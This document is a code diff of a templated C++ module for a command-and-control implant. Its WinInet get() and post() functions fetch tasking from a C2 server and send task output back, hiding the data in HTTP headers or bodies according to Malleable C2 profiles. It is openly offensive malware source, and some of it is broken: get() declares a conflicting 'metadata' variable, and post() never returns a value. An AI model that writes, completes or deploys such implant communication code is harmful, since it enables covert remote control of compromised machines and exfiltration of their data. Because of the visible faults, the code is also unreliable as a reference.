@@ -1,23 +1,22 @@
 [# 
 Name: WinInet HTTP get/post functions. 
 
-Explanation:... 
+Explanation: Handles the logic for GET (Tasking) and POST (Response) for the WinInet listener.
+Includes logic for Malleable C2 transforms and dynamic placement of data (headers vs body).
 
 Required Keys:
-
  - http_get_uri: URI of GET endpoint for the implant
+ - http_get_client_metadata_terminator: Terminator for the GET metadatablock ("header", "print")
+ - http_get_client_metadata_terminator_value: Value of terminator (ex, "utmcc")
 
- - http_get_client_metadata_terminator: Terminator for the GET metadatablock (used to deterine which code to include)
- - http_get_client_metadata_terminator_value: Value of terminator (ex, utmcc)
+ - http_get_client_output_terminator: Terminator for the GET client output
+ - http_get_client_output_terminator_value: Value of terminator
 
- - http_get_client_output_terminator: Terminator for the GET client output (used to deterine which code to include)
- - http_get_client_output_terminator_value:  Value of terminator (ex, utmcc)
+ - http_post_client_id_terminator: Terminator for the POST client id
+ - http_post_client_id_terminator_value: Value of terminator
 
- - http_post_client_id_terminator: Terminator for the POST client id (used to deterine which code to include)
- - http_post_client_id_terminator_value:  Value of terminator (ex, utmcc)
-
- - http_post_client_output_terminator: Terminator for the POST client output(used to deterine which code to include)
- - http_post_client_output_terminator_value:  Value of terminator (ex, utmcc)
+ - http_post_client_output_terminator: Terminator for the POST client output
+ - http_post_client_output_terminator_value: Value of terminator
 #]
 
 #include <vector>
@@ -26,46 +25,47 @@ Required Keys:
 #include "../data/transforms/transforms.h"
 #include "../data/msgpack/msgpack.h"
 
-nlohmann::json get(std::string implant_uuid) {
-    //note, pass a copy of implant_uuid in, as we are going to be potentialyl heavily editing it. 
+[% from 'transform_output.jinja' import render_transform_output -%]
+[% from 'transform_metadata.jinja' import render_transform_metadata -%]
+[% from 'transform_id.jinja' import render_transform_id -%]
 
+nlohmann::json get(std::string implant_uuid) {
+    // Note: pass a copy of implant_uuid in, as we are going to be potentially heavily editing it. 
     std::vector<uint8_t> http_response_buffer;
 
-    //create metadata
+    // Create metadata
     std::map<std::string, std::string> metadata;
     metadata["implant_uuid"] = implant_uuid;
 
     std::vector<uint8_t> metadata_as_msgpack;
     create_metadata(metadata, metadata_as_msgpack);
 
-    //hold bytes in string, as all the transforsm want a string
-    std::string payload(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
-
+    // Hold bytes in string, as all the transforms want a string
+    std::string metadata(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
     std::vector<std::wstring> headers;
 
-    [# Transforms here#]
+    // --- Transforms ---
+    [%- for transform in http_get_client_metadata_transforms_list %]
+    [[ render_transform_metadata(transform) ]]
+    [%- endfor %]
+    // --- End Transforms ---
 
-    //bsae64 encode the implant_uuid
-    //base64_encode_inplace(payload); //this should be metadata buffer
-
-    [# IF MC2 says it wants a header for where to find the metadata...#]
-    [% if http_get_client_metadata_terminator == "header" %]
-    headers.push_back(L"[[http_get_client_metadata_terminator_value]]: " + std::wstring(payload.begin(), payload.end()));
-    [% endif %]
+    [# IF MC2 says it wants a header for where to find the metadata... #]
+    [%- if http_get_client_metadata_terminator == "header" %]
+    headers.push_back(L"[[ http_get_client_metadata_terminator_value ]]: " + std::wstring(metadata.begin(), metadata.end()));
+    [%- endif %]
 
     if (HTTP_GET(headers, http_response_buffer)) {
         // Check if buffer is empty before decoding
         if (http_response_buffer.empty()) {
             return nullptr;
         }
+
+        // TODO: transform from raw data too...
         std::cout << "Success! Bytes read: " << http_response_buffer.size() << std::endl;
         nlohmann::json task_data = decode_msgpack_task(http_response_buffer);
         return task_data;
-
-    }
-    //could also check for 204, maybe do that at the HTTP_GET func level. For now, if no task/no body, it says no task and sleeps
-    else {
-        
+    } else {
         std::cerr << "Request failed." << std::endl;
         return nullptr;
     }
@@ -76,48 +76,54 @@ nlohmann::json get(std::string implant_uuid) {
 int post(std::string implant_uuid, std::string output_data, std::string task_uuid) {
     std::vector<uint8_t> task_response_msgpack;
 
-    //need to turn output data into msgpack
+    // Turn output data into msgpack
     create_task_response(implant_uuid, task_uuid, output_data, task_response_msgpack);
 
-    //any transformations to data
-    //hold bytes in string, as all the transforsm want a string
+    // Hold bytes in string, as all the transforms want a string
     std::string payload(task_response_msgpack.begin(), task_response_msgpack.end());
-        
-    //base64_encode_inplace(payload); //this should be metadata buffer
-    //transforms
+
+    // --- Transforms ---
+    [# Transform ID #]
+    [%- for transform in http_post_client_id_transforms_list %]
+    [[ render_transform_id(transform) ]]
+    [%- endfor %]
+
+    [# Transform Output #]
+    [%- for transform in http_post_client_output_transforms_list %]
+    [[ render_transform_output(transform) ]]
+    [%- endfor %]
+    // --- End Transforms ---
 
     std::vector<std::wstring> headers;
 
-    [# IF MC2 says it wants a header for storing the ID...#]
-    [% if http_post_client_id_terminator == "header" %]
-    headers.push_back(L"[[http_post_client_id_terminator_value]]: " + std::wstring(implant_uuid.begin(), implant_uuid.end()));
-    [% endif %]
+    [# IF MC2 says it wants a header for storing the ID... #]
+    [%- if http_post_client_id_terminator == "header" %]
+    headers.push_back(L"[[ http_post_client_id_terminator_value ]]: " + std::wstring(implant_uuid.begin(), implant_uuid.end()));
+    [%- endif %]
 
-    [# IF MC2 says it wants a parameter for storing the ID...#]
-    [% if http_post_client_id_terminator == "parameter" %]
-    //?
-    [% endif %]
+    [# IF MC2 says it wants a parameter for storing the ID... #]
+    [%- if http_post_client_id_terminator == "parameter" %]
+    // TODO: Implement parameter logic
+    [%- endif %]
 
-
-    [# IF MC2 says it wants a header for storing the output...#]
-    [% if http_post_client_output_terminator == "header" %]
-    headers.push_back(L"[[http_post_client_output_terminator_value]]: " + std::wstring(payload.begin(), payload.end()));
-    //this specific profile, no data in body. It's stored in utmcc
-    std::string payload_string = "";
-    [% endif %]
+    [# IF MC2 says it wants a header for storing the output... #]
+    [%- if http_post_client_output_terminator == "header" %]
+    headers.push_back(L"[[ http_post_client_output_terminator_value ]]: " + std::wstring(payload.begin(), payload.end()));
     
-    [# IF MC2 says it wants to store the output in the body#]
-    [% if http_post_client_output_terminator == "print" %]
+    // This specific profile, no data in body. It's stored in utmcc
+    std::string payload_string = "";
+    [%- endif %]
+    
+    [# IF MC2 says it wants to store the output in the body #]
+    [%- if http_post_client_output_terminator == "print" %]
     std::string payload_string = payload;
-    [% endif %]
+    [%- endif %]
 
-    //send
+    // Send
     std::vector<uint8_t> http_post_response_buffer;
     if (!HTTP_POST(payload_string, headers, http_post_response_buffer)) {
         std::cout << "Error occured posting data";
     };
     
-    //return 0;
-
-
+    // return 0;
 }
